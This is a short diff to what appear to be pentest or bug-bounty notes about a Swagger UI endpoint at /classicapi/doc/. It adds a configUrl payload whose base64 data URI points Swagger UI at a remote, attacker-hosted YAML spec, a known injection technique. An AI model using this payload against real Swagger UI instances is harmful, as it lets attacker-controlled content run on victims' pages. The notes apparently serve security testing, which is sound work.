@@ -1,6 +1,8 @@
 
 ## Swagger UI can be found at /classicapi/doc/
 
+- Added these payloads after `/classicapi/doc/`
+
 ### Payloads:
 
 • `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`
